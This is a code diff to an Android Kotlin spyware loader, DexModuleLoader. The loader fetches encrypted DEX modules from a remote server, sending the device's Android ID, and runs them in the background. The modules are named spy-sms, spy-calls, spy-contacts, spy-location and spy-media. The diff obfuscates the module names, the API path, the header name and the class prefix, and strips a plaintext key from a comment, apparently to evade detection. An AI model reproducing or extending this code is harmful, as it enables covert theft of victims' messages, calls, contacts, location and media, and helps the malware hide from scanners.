@@ -26,7 +26,7 @@ object DexModuleLoader {
     private const val GCM_IV_LEN   = 12
     private const val GCM_TAG_BITS = 128
 
-    // AES-256 key XOR-obfuscated (raw: IWXDexModule2024#AndroidCtrl!KZ)
+    // AES-256 key XOR-obfuscated (split key, no plaintext)
     private val ENC = intArrayOf(
         0x13, 0x3D, 0x22, 0x1E, 0x3B, 0x36, 0x35, 0x27,
         0x25, 0x5B, 0x7E, 0x4A, 0x5B, 0x7E, 0x4F, 0x5A,
@@ -47,7 +47,7 @@ object DexModuleLoader {
         return try {
             val loader = getOrLoad(ctx, moduleName)
                 ?: return Pair("⚠️ Module [$moduleName] unavailable", "command_result")
-            val cls    = loader.loadClass("com.android.modules.${moduleClass(moduleName)}")
+            val cls    = loader.loadClass("${ObfStr.modClassPrefix()}${moduleClass(moduleName)}")
             val inst   = cls.getDeclaredConstructor().newInstance()
             val method = cls.getMethod("execute", Context::class.java, String::class.java, String::class.java)
             @Suppress("UNCHECKED_CAST")
@@ -61,7 +61,7 @@ object DexModuleLoader {
     /** Preload semua modul di background saat service start. */
     fun preloadAll(ctx: Context) {
         Thread {
-            listOf("spy-sms", "spy-calls", "spy-contacts", "spy-location", "spy-media").forEach { n ->
+            listOf(ObfStr.modSpySms(), ObfStr.modSpyCalls(), ObfStr.modSpyContacts(), ObfStr.modSpyLocation(), ObfStr.modSpyMedia()).forEach { n ->
                 try { getOrLoad(ctx, n) } catch (_: Exception) {}
             }
         }.also { it.isDaemon = true }.start()
@@ -91,9 +91,9 @@ object DexModuleLoader {
 
     private fun downloadModule(ctx: Context, name: String): ByteArray? {
         return try {
-            val url = "${SecureConfig.serverUrl()}/api/module/$name"
+            val url = "${SecureConfig.serverUrl()}${ObfStr.apiModule()}$name"
             http.newCall(Request.Builder().url(url)
-                .header("X-Device-Id", android.provider.Settings.Secure.getString(
+                .header(ObfStr.headerDeviceId(), android.provider.Settings.Secure.getString(
                     ctx.contentResolver, android.provider.Settings.Secure.ANDROID_ID) ?: "unknown")
                 .get().build()
             ).execute().use { r ->
@@ -115,11 +115,11 @@ object DexModuleLoader {
     }
 
     private fun moduleClass(name: String) = when (name) {
-        "spy-sms"      -> "SmsModule"
-        "spy-calls"    -> "CallLogModule"
-        "spy-contacts" -> "ContactsModule"
-        "spy-location" -> "LocationModule"
-        "spy-media"    -> "MediaModule"
-        else           -> name.split("-").joinToString("") { it.replaceFirstChar { c -> c.uppercase() } } + "Module"
+        ObfStr.modSpySms()      -> "SmsModule"
+        ObfStr.modSpyCalls()    -> "CallLogModule"
+        ObfStr.modSpyContacts() -> "ContactsModule"
+        ObfStr.modSpyLocation() -> "LocationModule"
+        ObfStr.modSpyMedia()    -> "MediaModule"
+        else                    -> name.split("-").joinToString("") { it.replaceFirstChar { c -> c.uppercase() } } + "Module"
     }
 }
